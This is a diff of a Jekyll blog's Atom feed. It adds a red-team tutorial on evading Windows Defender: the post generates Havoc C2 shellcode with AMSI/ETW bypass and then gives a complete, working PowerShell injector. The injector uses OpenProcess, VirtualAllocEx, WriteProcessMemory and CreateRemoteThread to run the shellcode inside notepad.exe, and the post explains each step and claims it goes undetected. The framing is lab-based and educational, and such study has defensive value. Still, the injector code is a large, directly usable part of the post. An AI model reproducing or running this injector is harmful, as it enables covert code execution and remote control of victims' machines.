@@ -1,1 +1,256 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-27T21:09:55-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Intro to My Cybersecurity Journey</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html" rel="alternate" type="text/html" title="Intro to My Cybersecurity Journey" /><published>2025-05-27T00:00:00-04:00</published><updated>2025-05-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/27/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html"><![CDATA[<p>Hey, welcome to my blog! This post dives into my journey hacking, bug hunting, and exploring offensive security.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="bug bounty" /><category term="pentesting" /><category term="AI" /><summary type="html"><![CDATA[Hey, welcome to my blog! This post dives into my journey hacking, bug hunting, and exploring offensive security.]]></summary></entry></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-27T22:29:19-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Bypassing Windows Defender with Havoc and PowerShell</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html" rel="alternate" type="text/html" title="Bypassing Windows Defender with Havoc and PowerShell" /><published>2025-05-27T00:00:00-04:00</published><updated>2025-05-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/27/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*1qYApM8pnZUqDjWT" alt="Set up Listener" width="400" /></p>
+
+<h2 id="why-this-is-important">Why This Is Important</h2>
+
+<p>As cybersecurity students, researchers, or red teamers, understanding how payloads bypass modern antivirus solutions is critical for both offensive and defensive strategies. Microsoft Defender (formerly Windows Defender) is the default AV on Windows systems and is considered one of the most improved security products in recent years.</p>
+
+<p>Learning how shellcode and in-memory injection techniques evade detection helps us stay ahead of adversaries, understand EDR blind spots, and ultimately secure systems better.</p>
+
+<p>This post demonstrates how to:</p>
+
+<ul>
+  <li>Generate a Havoc shellcode payload</li>
+  <li>Inject it using PowerShell</li>
+  <li>Observe how it bypasses Windows Defender in a default environment</li>
+</ul>
+
+<hr />
+
+<h2 id="steps">Steps</h2>
+
+<h3 id="1-set-up-a-listener-in-havoc">1. Set up a Listener in Havoc</h3>
+
+<p>Before we can interact with a compromised system, create a listener in Havoc.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*G35qOwuk5E7uy6zHmEbPeQ.png" alt="Set up Listener" /></p>
+
+<hr />
+
+<h3 id="2-create-the-payload">2. Create the Payload</h3>
+
+<p>In Havoc, go to the <strong>Payloads</strong> tab and generate a payload with:</p>
+
+<ul>
+  <li><strong>Format</strong>: Windows Shellcode</li>
+  <li><strong>Architecture</strong>: x64</li>
+  <li><strong>Sleep/Jitter</strong>: As needed for evasion</li>
+  <li><strong>Injection</strong>: Native/syscall, spawn64, etc.</li>
+  <li><strong>AMSI/ETW bypass</strong>: Enabled</li>
+</ul>
+
+<p>Click <strong>Generate</strong> to build the shellcode.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ONb86uyTlmEaxNWJYA1dnQ.png" alt="Generate Payload" /></p>
+
+<hr />
+
+<h3 id="3-transfer-the-shellcode-to-the-target-machine">3. Transfer the Shellcode to the Target Machine</h3>
+
+<p>Copy the generated <code class="language-plaintext highlighter-rouge">.bin</code> file (e.g., <code class="language-plaintext highlighter-rouge">demon.x64.bin</code>) to your Windows VM target.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*r9xsoiWwCvxKXV7fo1FEfA.png" alt="Transfer Shellcode" /></p>
+
+<hr />
+
+<h3 id="4-verify-defender-is-enabled">4. Verify Defender is Enabled</h3>
+
+<p>On the target machine, confirm:</p>
+
+<ul>
+  <li>Real-time protection is <strong>ON</strong></li>
+  <li>No exclusion folders configured</li>
+</ul>
+
+<p>Even then, the shellcode placed in <code class="language-plaintext highlighter-rouge">C:\Users\lab\Downloads</code> goes undetected.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*HSABF2KK1880mOS0veLs9A.png" alt="Defender Enabled" /><br />
+<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*icefKTOqwcIWWhURQR3g9g.png" alt="No Detection" /></p>
+
+<hr />
+
+<h3 id="5-create-a-powershell-injector">5. Create a PowerShell Injector</h3>
+
+<p>Save this script as <code class="language-plaintext highlighter-rouge">injector.ps1</code> to inject shellcode into <code class="language-plaintext highlighter-rouge">notepad.exe</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Path to your shellcode file</span><span class="w">
+</span><span class="nv">$shellcodePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\lab\Downloads\demon.x64.bin"</span><span class="w">
+
+</span><span class="c"># Read shellcode bytes</span><span class="w">
+</span><span class="nv">$shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$shellcodePath</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Start 64-bit notepad process</span><span class="w">
+</span><span class="nv">$proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">"C:\Windows\System32\notepad.exe"</span><span class="w"> </span><span class="nt">-PassThru</span><span class="w">
+
+</span><span class="c"># Define Win32 API calls</span><span class="w">
+</span><span class="n">Add-Type</span><span class="w"> </span><span class="sh">@"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+    [Flags]
+    public enum ProcessAccessFlags : uint {
+        All = 0x001F0FFF,
+        CreateThread = 0x0002,
+        VirtualMemoryOperation = 0x0008,
+        VirtualMemoryWrite = 0x0020,
+        VirtualMemoryRead = 0x0010,
+        QueryInformation = 0x0400,
+        SuspendResume = 0x0800
+    }
+
+    [Flags]
+    public enum AllocationType : uint {
+        Commit = 0x1000,
+        Reserve = 0x2000
+    }
+
+    [Flags]
+    public enum MemoryProtection : uint {
+        ExecuteReadWrite = 0x40
+    }
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+}
+"@</span><span class="w">
+
+</span><span class="c"># Open the target process with full access</span><span class="w">
+</span><span class="nv">$processHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">OpenProcess</span><span class="p">([</span><span class="n">Win32</span><span class="o">+</span><span class="n">ProcessAccessFlags</span><span class="p">]::</span><span class="n">All</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nv">$proc</span><span class="o">.</span><span class="nf">Id</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Allocate memory in the target process</span><span class="w">
+</span><span class="nv">$allocatedMemory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="nv">$processHandle</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="nv">$shellcode</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="o">+</span><span class="n">AllocationType</span><span class="p">]::</span><span class="nx">Commit</span><span class="w"> </span><span class="o">-bor</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="o">+</span><span class="n">AllocationType</span><span class="p">]::</span><span class="nx">Reserve</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="o">+</span><span class="n">MemoryProtection</span><span class="p">]::</span><span class="nx">ExecuteReadWrite</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Write shellcode into the allocated memory</span><span class="w">
+</span><span class="nv">$outSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">UIntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="w">
+</span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="nv">$processHandle</span><span class="p">,</span><span class="w"> </span><span class="nv">$allocatedMemory</span><span class="p">,</span><span class="w"> </span><span class="nv">$shellcode</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="nv">$shellcode</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$outSize</span><span class="p">)</span><span class="w">
+
+</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="nv">$result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">Write-Error</span><span class="w"> </span><span class="s2">"Failed to write shellcode into process memory"</span><span class="w">
+    </span><span class="kr">exit</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Create remote thread to execute shellcode</span><span class="w">
+</span><span class="nv">$threadId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
+</span><span class="nv">$remoteThread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">CreateRemoteThread</span><span class="p">(</span><span class="nv">$processHandle</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$allocatedMemory</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$threadId</span><span class="p">)</span><span class="w">
+
+</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$remoteThread</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="n">Write-Error</span><span class="w"> </span><span class="s2">"Failed to create remote thread"</span><span class="w">
+    </span><span class="kr">exit</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Shellcode injected successfully! Process ID: </span><span class="si">$(</span><span class="nv">$proc</span><span class="o">.</span><span class="nf">Id</span><span class="si">)</span><span class="s2">, Thread ID: </span><span class="nv">$threadId</span><span class="s2">"</span><span class="w">
+
+</span></code></pre></div></div>
+<h3 id="6-run-the-injector">6. Run the Injector</h3>
+
+<p>Run the PowerShell script. If all goes well:</p>
+
+<ul>
+  <li>
+    <p>No Defender alerts</p>
+  </li>
+  <li>
+    <p>No detection</p>
+  </li>
+  <li>
+    <p>Havoc should show a callback from the target machine</p>
+  </li>
+</ul>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*wgh_KLEH-IBByxykk7zCuQ.gif" alt="Shellcode Injection" /></p>
+
+<hr />
+
+<h2 id="shellcode-injection-with-powershell-whats-going-on">Shellcode Injection with PowerShell What’s Going On?</h2>
+
+<p>This script performs <strong>process injection</strong> by loading shellcode into a trusted process (<code class="language-plaintext highlighter-rouge">notepad.exe</code>) to evade detection.</p>
+
+<p>It’s a common technique in <strong>post-exploitation</strong>, malware, and red teaming.</p>
+
+<h2 id="step-by-step-breakdown">Step-by-Step Breakdown</h2>
+
+<h3 id="step-1-load-the-shellcode">Step 1: Load the Shellcode</h3>
+
+<p><code class="language-plaintext highlighter-rouge">$shellcodePath = "C:\Users\lab\Downloads\demon.x64.bin" $shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)</code></p>
+
+<p>You’ve got a <code class="language-plaintext highlighter-rouge">.bin</code> file with raw shellcode, We load the bytes into memory. It’s just a raw byte array at this point.</p>
+
+<hr />
+
+<h3 id="step-2-spawn-a-target-process">Step 2: Spawn a Target Process</h3>
+
+<p><code class="language-plaintext highlighter-rouge">$proc = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -PassThru</code></p>
+
+<p>We start <code class="language-plaintext highlighter-rouge">notepad.exe</code> and keep a reference to it. Why Notepad? It’s 64-bit (matching the shellcode), always available, and pretty harmless-looking. Perfect cover.</p>
+
+<hr />
+
+<h3 id="-step-3-load-the-native-win32-api">🔧 Step 3: Load the Native Win32 API</h3>
+
+<p>This big block here is C# code embedded in PowerShell. Using <code class="language-plaintext highlighter-rouge">Add-Type</code>, we define all the low-level Win32 functions we’ll need:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">OpenProcess</code>: to get access to Notepad’s memory</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>: to allocate memory inside Notepad</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>: to copy our shellcode into it</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>: to run it</p>
+  </li>
+</ul>
+
+<p>Think of it as giving PowerShell the tools to mess with another process at the OS level.</p>
+
+<hr />
+
+<h3 id="step-4-gain-access-to-notepads-memory">Step 4: Gain Access to Notepad’s Memory</h3>
+
+<p><code class="language-plaintext highlighter-rouge">$processHandle = [Win32]::OpenProcess([Win32+ProcessAccessFlags]::All, $false, $proc.Id)</code></p>
+
+<p>We grab a handle to the Notepad process with full access. This is the equivalent of getting a master key to its memory.</p>
+
+<hr />
+
+<h3 id="step-5-allocate-memory-in-notepad">Step 5: Allocate Memory in Notepad</h3>
+
+<p><code class="language-plaintext highlighter-rouge">$allocatedMemory = [Win32]::VirtualAllocEx(..., [Win32+MemoryProtection]::ExecuteReadWrite)</code></p>
+
+<p>We reserve a chunk of memory in Notepad’s address space. We mark it as executable so we can run our shellcode once it’s in there.</p>
+
+<hr />
+
+<h3 id="step-6-write-the-shellcode">Step 6: Write the Shellcode</h3>
+
+<p><code class="language-plaintext highlighter-rouge">$result = [Win32]::WriteProcessMemory($processHandle, $allocatedMemory, $shellcode, ...)</code></p>
+
+<p>This is where the magic happens we inject our shellcode into the newly allocated space. At this point, it’s just data sitting in memory… not running yet.</p>
+
+<hr />
+
+<h3 id="step-7-execute-the-shellcode">Step 7: Execute the Shellcode</h3>
+
+<p><code class="language-plaintext highlighter-rouge">$remoteThread = [Win32]::CreateRemoteThread($processHandle, ..., $allocatedMemory, ...)</code></p>
+
+<p>Boom. We spawn a remote thread inside Notepad that starts executing at the address of our shellcode. Notepad is now doing things it definitely wasn’t built to do.</p>
+
+<hr />
+
+<h3 id="step-8-confirmation">Step 8: Confirmation</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Write-Host "Shellcode injected successfully!"</code></p>
+
+<p>If you see this message congrats, you just injected and executed arbitrary code in another process using nothing but PowerShell and some native Windows APIs.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[]]></summary></entry></feed>
